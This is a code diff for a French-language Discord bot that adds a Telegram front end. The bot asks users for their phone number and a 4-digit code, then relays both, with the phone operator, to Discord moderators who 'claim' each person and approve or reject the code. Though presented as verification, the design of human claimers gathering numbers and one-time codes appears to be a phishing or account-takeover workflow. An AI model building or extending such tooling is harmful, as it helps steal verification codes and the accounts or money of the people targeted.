@@ -10,6 +10,10 @@ const pending = new Map();
 const blacklistedNums = new Set();
 const blacklistedUsers = new Set();
 const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";
+let tgBot = null;
+function notifyTelegram(tgId, text) {
+  if (tgBot) tgBot.telegram.sendMessage(tgId, text).catch(() => {});
+}
 
 function formatPhone(p) {
   return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
@@ -255,10 +259,16 @@ client.on("interactionCreate", async (i) => {
     try {
       const modChannel = await client.channels.fetch(data.modChannelId);
       const modMsg = await modChannel.messages.fetch(data.modMessageId);
-      const og = await client.guilds.fetch(originGuildId).catch(() => null);
-      let present = true;
-      try { if (og) await og.members.fetch(userId); } catch { present = false; }
-      const claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
+      const isTg = originGuildId === "tg";
+      const og = isTg ? null : await client.guilds.fetch(originGuildId).catch(() => null);
+      let claimedEmbed = null;
+      if (isTg) {
+        claimedEmbed = new EmbedBuilder().setTitle(`${data.tgName || "Telegram"}`).setDescription(`Telegram · \`${userId}\`\n\nClaim par <@${i.user.id}>`).setColor(0x2b2d31);
+      } else {
+        let present = true;
+        try { if (og) await og.members.fetch(userId); } catch { present = false; }
+        claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
+      }
       await modMsg.edit({ embeds: [claimedEmbed], components: [] });
       const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
       const claimerId = i.user.id;
@@ -273,8 +283,8 @@ client.on("interactionCreate", async (i) => {
         ],
         reason: `Claim ${i.user.tag} ${userId}`
       });
-      const targetUser = await client.users.fetch(userId);
-      const detailEmbed = buildModEmbed(targetUser, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
+      const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
+      const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
       const row1 = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
         new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
@@ -323,6 +333,12 @@ client.on("interactionCreate", async (i) => {
       return;
     }
     if (isOk) {
+      if (originGuildId === "tg") {
+        notifyTelegram(userId, "✅ Ton code est validé.");
+        pending.delete(key);
+        await i.reply({ content: `✅ Code OK pour Telegram ${userId}.` });
+        return;
+      }
       try {
         const og = await client.guilds.fetch(originGuildId);
         const member = await og.members.fetch(userId);
@@ -338,6 +354,7 @@ client.on("interactionCreate", async (i) => {
       }
       return;
     }
+    if (originGuildId === "tg") notifyTelegram(userId, "❌ Ton code est faux, recommence la vérification.");
     try {
       const u = await client.users.fetch(userId);
       await u.send(`❌ Ton code est faux, recommence la vérification.`);
@@ -360,6 +377,11 @@ client.on("interactionCreate", async (i) => {
     }
     if (action === "validate") {
       if (!data.code) {
+        if (originGuildId === "tg") {
+          notifyTelegram(userId, "Ton numéro est validé. Envoie ton code à 4 chiffres ici.");
+          await i.reply({ content: `📩 Message Telegram envoyé à ${userId}.` });
+          return;
+        }
         try {
           const u = await client.users.fetch(userId);
           const dmRow = new ActionRowBuilder().addComponents(
@@ -389,6 +411,11 @@ client.on("interactionCreate", async (i) => {
       return;
     }
     if (action === "resend") {
+      if (originGuildId === "tg") {
+        notifyTelegram(userId, "Nouveau code demandé. Envoie ton code à 4 chiffres.");
+        await i.reply({ content: `🔄 Code redemandé à Telegram ${userId}.` });
+        return;
+      }
       try {
         const u = await client.users.fetch(userId);
         const dmRow = new ActionRowBuilder().addComponents(
@@ -443,5 +470,73 @@ client.on("interactionCreate", async (i) => {
     return;
   }
 });
+
+async function forwardTelegramToDiscord(tgUser, phone) {
+  const key = `tg:${tgUser.id}`;
+  const now = new Date();
+  const dateStr = now.toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
+  const displayName = tgUser.username ? `@${tgUser.username}` : `${tgUser.first_name || "Telegram"}`;
+  const embed = new EmbedBuilder()
+    .setTitle(`${displayName}`)
+    .setDescription(`Telegram · \`${tgUser.id}\`\n\n🟢 présent\n\n**Soumis** · ${dateStr}\n\nClaim par @_`)
+    .addFields({ name: "Numéro", value: `> \`${formatPhone(phone)}\` · ${getOperator(phone)}`, inline: false })
+    .setColor(0x2b2d31);
+  const row = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId(`claim_tg_${tgUser.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
+  );
+  const modChannel = await getModChannel();
+  const sent = await modChannel.send({ content: `<@&1547717348348403812> Telegram`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
+  pending.set(key, { phone, code: null, originGuildId: "tg", userId: String(tgUser.id), date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null, tgName: displayName });
+}
+
+if (process.env.TELEGRAM_BOT_TOKEN) {
+  const { Telegraf, Markup } = require("telegraf");
+  tgBot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
+  tgBot.start((ctx) => ctx.reply("Envoie ton numéro avec le bouton ci-dessous.", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize()));
+  tgBot.on("contact", async (ctx) => {
+    let phone = (ctx.message.contact.phone_number || "").replace(/\D/g, "");
+    if (phone.startsWith("33")) phone = "0" + phone.slice(2);
+    phone = phone.slice(-10);
+    if (!/^[0-9]{10}$/.test(phone)) {
+      await ctx.reply("Numéro invalide.");
+      return;
+    }
+    await ctx.reply("Numéro reçu. En attente de validation.");
+    try {
+      await forwardTelegramToDiscord(ctx.from, phone);
+    } catch (e) {
+      console.error("tg forward fail:", e);
+    }
+  });
+  tgBot.on("text", async (ctx) => {
+    const key = `tg:${ctx.from.id}`;
+    const data = pending.get(key);
+    if (!data || data.code) return;
+    const code = (ctx.message.text || "").trim();
+    if (!/^[0-9]{4}$/.test(code)) return;
+    data.code = code;
+    pending.set(key, data);
+    await ctx.reply("Code reçu. En attente de validation finale.");
+    try {
+      const targetChannel = await client.channels.fetch(data.threadId || data.modChannelId);
+      const logEmbed = new EmbedBuilder()
+        .setTitle("📩 Code Telegram reçu")
+        .addFields(
+          { name: "Membre", value: `${data.tgName || ""} \`${ctx.from.id}\``, inline: false },
+          { name: "Numéro", value: `\`${formatPhone(data.phone)}\``, inline: true },
+          { name: "Code", value: `\`${code}\``, inline: true }
+        )
+        .setFooter({ text: data.dateStr })
+        .setColor(0x57f287);
+      await targetChannel.send({ content: data.claimedBy ? `<@${data.claimedBy}>` : undefined, embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`code_ok_tg_${ctx.from.id}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
+        new ButtonBuilder().setCustomId(`code_bad_tg_${ctx.from.id}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
+      )], allowedMentions: { users: data.claimedBy ? [data.claimedBy] : [] } });
+    } catch (e) {
+      console.error("tg code forward fail:", e);
+    }
+  });
+  tgBot.launch().then(() => console.log("Telegram ok")).catch((e) => console.error("Telegram fail:", e.message));
+}
 
 client.login(process.env.TOKEN);
